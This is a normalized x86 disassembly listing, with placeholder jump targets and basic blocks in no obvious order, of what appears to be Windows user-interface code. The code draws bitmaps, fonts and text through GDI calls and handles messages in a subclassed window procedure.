mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
mov edx [ ecx + eax + 0x4 ]
cmp edx [ esp + 0x28 ]
jne r-xdata
cmp esi edx
jge r-xdata
xor eax eax
mov ecx [ esp + 0x93c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
push edi
call [ SelectObject@IAT ]
mov eax [ esp + 0x48 ]
push eax
push 0x0
call [ ReleaseDC@IAT ]
mov ecx [ rw-data ]
mov edx [ esp + 0x20 ]
push 0xcc0020
push 0x0
push 0x0
push ecx
push edx
push esi
push 0x0
push 0x0
push edi
call [ BitBlt@IAT ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
mov edx [ rw-data ]
push 0xcc0020
push eax
push ecx
mov ecx [ esp + 0x3c ]
push edx
mov edx [ esp + 0x34 ]
sub ecx eax
push ecx
push esi
push eax
mov eax [ esp + 0x2c ]
add edx eax
push edx
push edi
call [ BitBlt@IAT ]
call [ GdiFlush@IAT ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x14 ]
push edi
push ecx
push esi
push edx
sub esp 0x428
mov edi esp
mov ecx 0x10a
lea esi [ esp + 0x520 ]
[ edi ] [ esi ]
movzx ecx [ esp + 0x52e ]
push eax
or ecx 0x10000000
push ecx
push 0x0
mov ecx rw-data
call sub_43e840
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call [ DeleteObject@IAT ]
mov ecx rw-data
call sub_401420
lea ecx [ esp + 0x1c ]
mov [ esp + 0x944 ] 0xffffffff
call sub_40b360
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x64 ]
call sub_401e80
lea ecx [ esp + 0x5c ]
push ecx
mov ecx rw-data
mov [ esp + 0x948 ] 0x3
call sub_407460
cmp [ esp + 0x74 ] 0x10
mov [ esp + 0x944 ] 0x1
jb r-xdata
xor eax eax
mov ecx 0xb
lea edi [ esp + 0x510 ]
[ edi ]
mov ecx [ esp + 0x18 ]
lea eax [ esi + 0x3 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
shl eax 0x2
mov [ esp + 0x514 ] eax
mov eax [ esp + 0x20 ]
push 0x0
add eax ecx
push 0x0
mov [ esp + 0x54 ] eax
neg eax
lea edx [ esp + 0x50 ]
push edx
mov [ esp + 0x524 ] eax
push 0x0
lea eax [ esp + 0x520 ]
push eax
push 0x0
mov [ esp + 0x528 ] 0x28
mov [ esp + 0x538 ] 0x0
mov [ esp + 0x534 ] 0x1
mov [ esp + 0x536 ] 0x18
call [ CreateDIBSection@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esp + 0x14 ] ebx
jge r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push edi
call sub_401e80
call sub_401530
add esp 0x1c
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov esi [ rw-data ]
imul eax eax 0x70
mov ecx [ esp + 0x10 ]
mov edx [ eax + esi + 0x48 ]
add eax esi
inc ecx
cmp edx ecx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x20c ]
test eax eax
mov esi [ rw-data ]
jne r-xdata
mov ebx [ esp + 0x18 ]
mov eax ebx
imul eax [ esp + 0x38 ]
cdq
idiv [ esp + 0x34 ]
mov edi [ esp + 0x10 ]
cmp eax edi
mov [ esp + 0x14 ] eax
jge r-xdata
inc esi
add eax 0x10
jmp r-xdata
mov edx [ ecx + eax ]
cmp edx [ esp + 0x24 ]
jle r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x10 ]
lea edx [ ecx + eax ]
mov eax [ rw-data ]
mov [ esp + 0x2c ] edx
mov edx [ esp + 0x3c ]
add eax edx
mov [ eax ] ecx
mov ecx [ esp + 0x28 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x2c ]
mov [ eax + 0x8 ] edx
mov ecx [ esp + 0x30 ]
mov [ eax + 0xc ] ecx
mov ecx [ rw-data ]
xor esi esi
xor eax eax
mov edx [ esp + 0x60 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0x0
call [ GetDC@IAT ]
push eax
mov [ esp + 0x18 ] eax
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
push ebx
jne r-xdata
mov edx [ esp + 0x10 ]
mov edi [ esp + 0x18 ]
add edx ecx
add edi eax
test ecx ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] edx
mov [ esp + 0x30 ] edi
jle r-xdata
mov edx [ edi - 0x4 ]
cmp eax edx
jge r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test ebx ebx
jne r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
imul eax eax 0x70
mov ecx [ eax + edx + 0x48 ]
add eax edx
mov edx [ esp + 0x10 ]
inc edx
cmp ecx edx
jne r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_40b320
mov ebx 0x1
mov [ esp + 0x44 ] ebx
cmp [ edi + 0x210 ] 0x10
jb r-xdata
mov edi [ esp + 0x40 ]
jmp r-xdata
fild [ esp + 0x14 ]
mov eax [ esp + 0x50 ]
sub eax [ esp + 0x54 ]
fidiv [ esp + 0x38 ]
mov [ esp + 0x3c ] eax
push ecx
fimul [ esp + 0x40 ]
fstp [ esp ]
call sub_452500
mov esi eax
add esp 0x4
test esi esi
jge r-xdata
mov [ esp + 0x14 ] edi
test ecx ecx
jne r-xdata
mov edi edx
add edi ebx
mov [ ecx + eax ] edi
mov ecx [ rw-data ]
add [ ecx + eax + 0x8 ] ebx
mov ecx [ rw-data ]
push edi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
push 0x0
call [ ReleaseDC@IAT ]
mov edx [ rw-data ]
mov eax [ esp + 0x20 ]
push 0xcc0020
push 0x0
push 0x0
push edx
push eax
push esi
push 0x0
push 0x0
push edi
call [ BitBlt@IAT ]
call [ GdiFlush@IAT ]
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x48 ]
movzx eax [ esp + 0x51e ]
push edi
push ecx
push esi
push edx
sub esp 0x428
mov edi esp
push ebx
or eax 0x10000000
mov ecx 0x10a
lea esi [ esp + 0x94c ]
push eax
[ edi ] [ esi ]
push 0x0
mov ecx rw-data
call sub_43e840
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x30 ]
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] eax
call [ DeleteObject@IAT ]
mov edx [ edi ]
cmp ecx edx
jge r-xdata
or ecx 0xffffffff
mov eax edx
mov eax 0xf
xor esi esi
mov [ esp + 0x90 ] eax
mov [ esp + 0x8c ] esi
mov [ esp + 0x7c ] 0x0
mov [ esp + 0xe4 ] eax
mov [ esp + 0xe0 ] esi
mov [ esp + 0xd0 ] 0x0
mov ecx [ esp + 0x10 ]
push esi
push esi
push esi
lea edx [ esp + 0x84 ]
push edx
push esi
lea eax [ esp + 0x6c ]
push eax
dec ecx
push ecx
push edi
mov [ esp + 0x964 ] 0x2
call sub_409a30
add esp 0x20
test eax eax
jl r-xdata
mov ebx [ esp + 0x10 ]
push 0x0
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x54 ]
lea eax [ esp + 0xfc ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
dec ebx
push ebx
push 0x0
push 0x0
push edx
call sub_406950
add esp 0x2c
test eax eax
jl r-xdata
push edi
call sub_405ce0
add esp 0x4
cmp eax 0x1
jne r-xdata
call sub_40af00
mov esi [ esp + 0x1c ]
push eax
push 0x0
mov ecx esi
call sub_444100
mov [ esp + 0x34 ] eax
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_4440b0
mov esi eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x164 ]
test ecx ecx
mov [ esp + 0x38 ] esi
jne r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_40b320
mov [ esp + 0x44 ] 0x1
jmp r-xdata
add edi 0x1fc
mov edi [ edi + 0x1fc ]
jmp r-xdata
push edi
call [ lstrlenA@IAT ]
push 0x0
mov ebx eax
call [ GetStockObject@IAT ]
push eax
lea eax [ esp + 0x28 ]
push eax
push esi
call [ FillRect@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ esi + edi ]
cmp ecx eax
jle r-xdata
xor esi esi
inc [ esp + 0x14 ]
add edi 0x10
jmp r-xdata
mov ecx edx
lea ecx [ esp + 0x78 ]
mov [ esp + 0x944 ] 0x1
call sub_401a90
cmp [ esp + 0x90 ] 0x10
mov eax [ esp + 0x7c ]
jae r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x18 ]
push 0x0
push eax
push ecx
push edx
sub esp 0x428
mov ecx 0x10a
lea esi [ esp + 0x520 ]
mov edi esp
[ edi ] [ esi ]
mov ecx [ esp + 0x448 ]
jmp r-xdata
mov ebx [ esp + 0x10 ]
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x4c ]
lea eax [ esp + 0xf4 ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
push 0x3f800000
dec ebx
push ebx
push edx
call sub_405d40
add esp 0x20
cmp eax 0x1
jne r-xdata
cmp [ eax + 0x168 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
push eax
push esi
call [ SelectObject@IAT ]
push 0x1
push esi
call [ SetBkMode@IAT ]
push 0x0
push esi
call [ SetTextColor@IAT ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push ebx
push edi
push ecx
add edx 0x12
push edx
push esi
call [ TextOutA@IAT ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ esp + 0x3c ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x40 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
call sub_474e40
add esp 0x10
call [ GdiFlush@IAT ]
mov esi [ esp + 0x1c ]
push r--data
push eax
push eax
push eax
push eax
push 0x80
push eax
push eax
push eax
push 0x190
push 0xa8c
push 0xa8c
push eax
push 0x10
call [ CreateFontA@IAT ]
mov [ rw-data ] eax
mov edx [ rw-data ]
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
mov [ esp + 0x48 ] edx
mov [ esp + 0x54 ] eax
call sub_40af00
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x38 ]
push 0x0
push ecx
mov ecx [ esp + 0x3c ]
push ebx
push edx
mov edx [ esp + 0x68 ]
push 0x0
push esi
mov esi [ esp + 0x44 ]
push ebx
push edi
push eax
push ecx
push edx
mov ecx esi
call sub_4421e0
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
sub esp 0x10
mov edx esp
mov [ edx ] eax
add edi eax
mov [ edx + 0x4 ] ecx
add ebx ecx
mov [ edx + 0x8 ] edi
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] ebx
mov [ edx + 0xc ] ebx
call sub_474e40
add esp 0x10
call [ GdiFlush@IAT ]
jmp r-xdata
mov esi eax
sub esi edi
jns r-xdata
push esi
push esi
push esi
push esi
push 0x1
push eax
call sub_439280
mov edx [ esp + 0x70 ]
mov ecx [ esp + 0x34 ]
add esp 0x4
push eax
push edx
push esi
call sub_4402e0
mov ebx eax
mov [ esp + 0x44 ] ebx
lea eax [ esp + 0x7c ]
mov eax [ esp + 0x458 ]
push eax
push ecx
mov ecx [ esp + 0x45c ]
push ebx
call sub_43e840
mov ebx eax
mov [ esp + 0x44 ] ebx
jmp r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x18 ]
push 0x0
push eax
push ecx
push edx
sub esp 0x428
mov ecx 0x10a
lea esi [ esp + 0x520 ]
mov edi esp
[ edi ] [ esi ]
movzx ecx [ esp + 0x52e ]
or ecx 0x10000000
add eax 0x154
mov eax [ eax + 0x154 ]
jmp r-xdata
cmp eax esi
mov [ esp + 0x10 ] eax
jle r-xdata
test esi esi
mov [ esp + 0x944 ] 0xffffffff
je r-xdata
mov al [ ebp + 0xc ]
test al al
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
xor esi esi
test ebx ebx
je r-xdata
fild [ esp + 0x10 ]
push ecx
fimul [ rw-data ]
fidiv [ esp + 0x38 ]
fstp [ esp ]
call sub_452500
mov [ esp + 0x14 ] eax
mov eax [ rw-data ]
add esp 0x4
jmp r-xdata
mov [ esp + 0x10 ] esi
push eax
call j_sub_4b692d
add esp 0x4
mov ecx rw-data
call sub_401420
dec [ esi + 0xd48 ]
jne r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov [ esp + 0x18 ] eax
call sub_40af00
push eax
push 0x0
mov ecx rw-data
call sub_4440b0
mov esi eax
call sub_40af00
push eax
push 0x0
mov ecx rw-data
call sub_444100
mov [ esp + 0x20 ] eax
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
sub eax ecx
sar eax 0x4
dec eax
push eax
call sub_429a30
add esp 0x4
jmp r-xdata
xor eax eax
dec eax
push eax
call sub_429a30
add esp 0x4
jmp r-xdata
sub_493e90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c162b
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x188
cmp eax 0x201
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1a8 ]
ja r-xdata
cmp eax 0x405
ja r-xdata
je r-xdata
cmp eax 0x406
jne r-xdata
je r-xdata
mov esi [ esp + 0x1b4 ]
mov ebp [ SendMessageA@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
movzx ebx si
push 0x419
push edi
mov [ esp + 0x20 ] ebx
shr esi 0x10
call ebp
cmp [ rw-data ] 0x2
jl r-xdata
mov ebx 0xf
cmp eax ebx
ja r-xdata
mov edx [ esp + 0x1b4 ]
mov eax [ esp + 0x1b0 ]
mov ecx [ esp + 0x1ac ]
push edx
mov edx [ esp + 0x1ac ]
push eax
mov eax [ rw-data ]
push ecx
push edx
push eax
call [ CallWindowProcA@IAT ]
mov edi [ esp + 0x1a8 ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x400
push edi
call esi
test eax eax
mov ebx [ GetParent@IAT ]
mov ebp [ GetDlgItem@IAT ]
jle r-xdata
mov esi [ esp + 0x1b4 ]
cmp esi 0x1
jge r-xdata
cmp eax 0x20a
je r-xdata
cmp [ esp + 0x1c ] ebx
jge r-xdata
cmp eax 0x200
jne r-xdata
je r-xdata
mov ecx [ rw-data ]
mov eax 0xa
cmp ecx eax
mov edi 0x3
jl r-xdata
cmp [ rw-data ] 0x2
mov ecx [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
cmp esi eax
jle r-xdata
mov esi 0x1
mov [ esp + 0x1b4 ] esi
mov eax [ esp + 0x1b0 ]
shr eax 0x10
movsx ecx ax
mov eax 0x77777777
imul ecx
mov eax [ rw-data ]
sub edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp eax 0x2
je r-xdata
cmp eax 0x2a3
jne r-xdata
mov eax [ esp + 0x1a8 ]
lea edx [ esp + 0x1c ]
push edx
push 0x0
push 0x41a
push eax
call ebp
mov ecx [ rw-data ]
mov esi [ esp + 0x1c ]
add ecx 0xfffffffe
add esi 0x4
xor ebx ebx
test ecx ecx
jle r-xdata
cmp ebx [ esp + 0x24 ]
jge r-xdata
mov ebx [ esp + 0x1a8 ]
mov esi [ SendMessageA@IAT ]
lea eax [ esp + 0x3c ]
push eax
xor ebp ebp
push ebp
push 0x41a
push ebx
call esi
mov edi [ rw-data ]
mov [ esp + 0x2c ] ebp
mov [ esp + 0x14 ] 0x8
mov [ esp + 0x10 ] 0xffffffff
mov [ esp + 0x18 ] ebp
mov ecx [ esp + 0x1b4 ]
mov edx [ esp + 0x1b0 ]
mov esi [ esp + 0x1a8 ]
mov eax [ rw-data ]
push ecx
push edx
push ebx
push esi
push eax
call [ CallWindowProcA@IAT ]
mov eax [ rw-data ]
test eax eax
mov ebx [ SelectObject@IAT ]
jle r-xdata
sub eax 0x2
je r-xdata
mov edx [ esp + 0x1a8 ]
push edx
call ebx
mov esi eax
push 0x65
push esi
call ebp
mov ebp [ GetWindowRect@IAT ]
mov ebx eax
lea eax [ esp + 0x1c ]
push eax
push ebx
call ebp
mov ecx [ esp + 0x24 ]
lea eax [ edi + edi * 2 ]
mov edi [ esp + 0x1c ]
shl eax 0x1
sub ecx edi
cmp ecx eax
jge r-xdata
lea eax [ eax + eax * 4 ]
shl eax 0x1
add edi 0x2
cmp ecx eax
jge r-xdata
push ecx
push eax
lea eax [ esp + 0xa0 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x10
push edi
call ebx
push 0x65
push eax
call ebp
lea ecx [ esp + 0x98 ]
push ecx
push 0x0
push 0xc
push eax
call esi
mov edx ecx
sub edx eax
inc edx
mov eax edx
push eax
push esi
lea ecx [ esp + 0xa0 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
push edi
call [ GetParent@IAT ]
push 0x65
push eax
call [ GetDlgItem@IAT ]
lea edx [ esp + 0x98 ]
push edx
push 0x0
push 0xc
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
lea ecx [ esi - 0x1 ]
cmp ecx eax
je r-xdata
mov esi eax
mov [ esp + 0x1b4 ] esi
test edx edx
jle r-xdata
test edx edx
jl r-xdata
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0x0
jmp r-xdata
mov edi [ esp + 0x3c ]
mov edi edi
cmp [ esp + 0x20 ] esi
jge r-xdata
mov eax [ rw-data ]
sub eax edi
sar eax 0x5
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
call [ GetDC@IAT ]
mov ecx [ rw-data ]
mov edi eax
xor eax eax
cmp ecx 0x3
setne al
dec eax
and eax 0xff8100ff
add eax 0xff0000
push eax
call [ CreateSolidBrush@IAT ]
push eax
push edi
mov [ esp + 0x3c ] eax
call ebx
push 0x0
push 0x1
push 0x5
mov [ esp + 0x20 ] eax
call [ CreatePen@IAT ]
push eax
push edi
mov [ esp + 0x20 ] eax
call ebx
lea ecx [ esp + 0x4c ]
push ecx
push 0x0
push 0x419
push esi
mov [ esp + 0x48 ] eax
call [ SendMessageA@IAT ]
lea edx [ esp + 0x4c ]
push edx
call [ CreateRectRgnIndirect@IAT ]
push 0x3
mov ebp eax
push ebp
push edi
call [ ExtSelectClipRgn@IAT ]
push ebp
call [ DeleteObject@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea edx [ esp + 0x1c ]
push edx
push 0x0
inc eax
push 0x41a
inc ecx
push esi
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] ecx
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
xor ebp ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x5
jne r-xdata
xor edi edi
mov edi [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
push 0xe
sub edx edi
push edx
add eax 0x4
push eax
xor edi edi
push edi
push edi
push edi
push ebx
call [ SetWindowPos@IAT ]
lea eax [ esp + 0x1c ]
push eax
push esi
call ebp
mov ecx [ esp + 0x28 ]
mov ebx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
sub ecx ebx
movzx eax cx
sub edx [ esp + 0x1c ]
movzx ecx dx
shl eax 0x10
or eax ecx
push eax
push edi
push 0x5
push esi
call [ SendMessageA@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
sub esi eax
lea eax [ esi - 0x1 ]
xor edx edx
test eax eax
setg dl
push 0x1
push 0x0
push edi
lea edx [ edx + edx - 0x1 ]
push edx
push eax
call sub_4719b0
mov eax [ rw-data ]
add esp 0x14
push eax
call [ UpdateWindow@IAT ]
mov eax [ rw-data ]
push eax
push 0x1
push 0x0
call sub_48a5f0
add esp 0xc
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x1
call sub_48a5f0
add esp 0xc
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax ecx
sub eax edi
cdq
xor eax edx
sub eax edx
mov [ esp + 0x3c ] eax
mov eax ecx
mov ecx [ esp + 0x3c ]
sub eax esi
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
mov edx [ esp + 0x1a8 ]
push 0x0
add ebx 0xfffffffe
push ebx
push 0x40f
push edx
call ebp
mov ebx [ rw-data ]
mov ecx edi
sub ecx eax
mov eax ecx
cdq
sub eax edx
mov ecx eax
mov eax [ esp + 0x10 ]
sub eax edi
cdq
xor eax edx
sar ecx 0x1
sub eax edx
cmp eax ecx
jge r-xdata
mov ecx [ rw-data ]
add ecx 0xfffffffe
cmp ebx ecx
jne r-xdata
mov eax [ rw-data ]
inc ebx
add eax 0xfffffffe
cmp ebx eax
mov esi edi
jl r-xdata
cmp esi [ esp + 0x28 ]
jl r-xdata
mov eax [ esp + 0x10 ]
cmp [ rw-data ] eax
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx + edi ]
cmp [ rw-data ] 0x2
jne r-xdata
cmp ebp eax
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x5
test eax eax
jbe r-xdata
mov eax [ esp + ebp + 0x2c ]
mov edx [ esp + ebp + 0x2c ]
mov eax ecx
sub eax edx
inc eax
jmp r-xdata
push eax
call [ DestroyWindow@IAT ]
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
jmp r-xdata
cmp [ eax + 0x244 ] edi
je r-xdata
mov ecx rw-data
call sub_46aa20
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x1b4 ]
mov ecx [ rw-data ]
sub ecx edx
inc ecx
mov [ esp + 0x1b4 ] ecx
jmp r-xdata
mov ecx [ esp + 0x198 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x194
retn 0x10
mov edi esi
inc ebx
add ebx 0x2
jmp r-xdata
mov edi [ esp + 0x24 ]
sub edi [ esp + 0x1c ]
jmp r-xdata
dec ebx
jmp r-xdata
mov edx [ esp + 0x1a8 ]
push 0x0
push ebx
push 0x40f
push edx
call ebp
mov edi eax
cmp edi [ esp + 0x10 ]
jg r-xdata
jmp r-xdata
mov ebx [ rw-data ]
test ebx ebx
mov ebp [ esp + 0x1a8 ]
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edx ecx
sub edx eax
inc edx
mov eax edx
xor eax eax
jmp r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
push esi
call [ GetDC@IAT ]
mov ebp [ CreateSolidBrush@IAT ]
push 0xffff
mov edi eax
call ebp
push 0xff
mov [ esp + 0x1c ] eax
call ebp
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x18 ]
push eax
push edi
call ebx
mov edx [ rw-data ]
mov [ esp + 0x3c ] eax
xor eax eax
cmp edx 0x3
setne al
dec eax
and eax 0xff41007f
add eax 0xff8080
push eax
call ebp
mov ecx [ rw-data ]
mov [ esp + 0x34 ] eax
xor eax eax
cmp ecx 0x3
setne al
dec eax
and eax 0xff410000
add eax 0xff00ff
push eax
call ebp
lea ecx [ esp + 0x4c ]
push ecx
push 0x0
push 0x419
push esi
mov [ esp + 0x24 ] eax
call [ SendMessageA@IAT ]
lea edx [ esp + 0x4c ]
push edx
call [ CreateRectRgnIndirect@IAT ]
push 0x3
mov ebp eax
push ebp
push edi
call [ ExtSelectClipRgn@IAT ]
push ebp
call [ DeleteObject@IAT ]
lea eax [ esp + 0x1c ]
push eax
xor ebp ebp
push ebp
push 0x41a
push esi
call [ SendMessageA@IAT ]
mov [ esp + 0x2c ] ebp
mov [ esp + 0x10 ] ebp
nop
cmp eax ecx
jne r-xdata
mov eax [ esp + 0x1c ]
add eax 0x3
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ eax + 0x248 ] 0x10
jb r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
xor eax eax
mov [ esp + 0x14 ] 0x8
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x2c ]
xor eax eax
mov ecx 0xb
lea edi [ esp + 0x6c ]
[ edi ]
xor ecx ecx
mov [ esp + 0x80 ] ecx
lea ecx [ esp + 0x6c ]
push ecx
push 0x0
lea eax [ edx - 0xa ]
push 0x405
add edx 0x6
mov edi 0x16
push ebx
mov [ esp + 0x7c ] 0x2c
mov [ esp + 0x80 ] 0x102
mov [ esp + 0x84 ] ebp
mov [ esp + 0x88 ] 0x1
mov [ esp + 0x8c ] eax
mov [ esp + 0x94 ] edx
mov [ esp + 0x98 ] edi
call esi
mov eax [ esp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
push ebx
push 0xfffffffa
push ebp
call [ GetWindowLongA@IAT ]
push eax
push ebx
push ebp
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000041
push r--data
push r--data
push ebx
call [ CreateWindowExA@IAT ]
mov ebx eax
mov [ rw-data ] ebx
cmp eax ecx
jne r-xdata
mov ecx [ esp + 0x3c ]
add ecx 0x3
jmp r-xdata
cmp [ eax + 0x88 ] 0x10
jb r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
push 0x0
add eax 0xfffffffe
push eax
push 0x40f
push esi
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
mov edx [ esp + 0x24 ]
add edx 0xfffffffc
mov [ esp + ebp + 0x3c ] edx
jmp r-xdata
mov [ esp + ebp + 0x3c ] eax
add eax 0x234
mov eax [ eax + 0x234 ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
cmp eax 0x2
mov edx [ esp + 0x2c ]
mov esi [ edx + ecx ]
jne r-xdata
cmp [ esp + 0x18 ] eax
mov eax [ rw-data ]
jge r-xdata
mov al [ rw-data ]
test al al
mov ecx [ esp + 0x10 ]
mov [ rw-data ] ecx
je r-xdata
mov edx eax
mov eax [ rw-data ]
shl edx 0x5
mov ecx [ edx + eax + 0x1c ]
cmp ecx 0x10
lea eax [ edx + eax + 0x4 ]
jb r-xdata
push 0x0
add eax 0xfffffffe
push eax
push 0x40f
push ebx
call esi
mov edi [ rw-data ]
mov ecx eax
mov ecx [ esp + 0x44 ]
add ecx 0xfffffffc
jmp r-xdata
movzx eax [ esp + 0x1b4 ]
sub eax ecx
add eax 0x2
cdq
xor eax edx
sub eax edx
cmp eax [ esp + 0x14 ]
jge r-xdata
add eax 0x74
mov eax [ eax + 0x74 ]
jmp r-xdata
mov ecx [ esp + 0x3c ]
push ecx
push edi
call ebx
mov edx [ esp + 0x18 ]
mov ebp [ DeleteObject@IAT ]
push edx
call ebp
mov eax [ esp + 0x38 ]
push eax
call ebp
mov ecx [ esp + 0x34 ]
push ecx
call ebp
mov edx [ esp + 0x14 ]
push edx
call ebp
push edi
push esi
call [ ReleaseDC@IAT ]
cmp [ rw-data ] 0x2
mov edx [ rw-data ]
jne r-xdata
cmp [ esp + 0x2c ] eax
jge r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x40 ]
cmp eax ecx
jne r-xdata
add ebp 0x4
cmp ebp 0x8
jl r-xdata
mov ebx 0xf
or ebp 0xffffffff
cmp [ eax ] 0x0
mov esi eax
je r-xdata
mov eax [ esp + 0x1a8 ]
push ebx
push 0x1
push 0x405
push eax
call ebp
mov ecx [ esp + 0x1b4 ]
movsx edx di
and ecx 0xffff0000
or ecx edx
mov [ esp + 0x1b4 ] ecx
jmp r-xdata
mov eax [ rw-data ]
sub eax ebx
inc eax
mov ebx eax
cmp esi 0x1
jne r-xdata
mov eax [ rw-data ]
sub eax esi
inc eax
mov esi eax
mov edx [ esp + 0x1a8 ]
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x20 ] 0x10
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] edx
call [ _TrackMouseEvent@IAT ]
mov [ rw-data ] 0x1
jmp r-xdata
add eax 0x4
mov [ esp + 0x90 ] eax
mov ecx [ eax + 0x4 ]
mov [ esp + 0x90 ] ecx
jmp r-xdata
mov eax [ esp + 0x18 ]
inc ebp
add eax 0x20
mov [ esp + 0x18 ] eax
jmp r-xdata
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] ebp
mov [ esp + 0x2c ] ecx
push esi
call [ GetDC@IAT ]
mov ebp [ SendMessageA@IAT ]
mov edi eax
lea eax [ esp + 0x1c ]
push eax
push 0x0
push 0x41a
push esi
call ebp
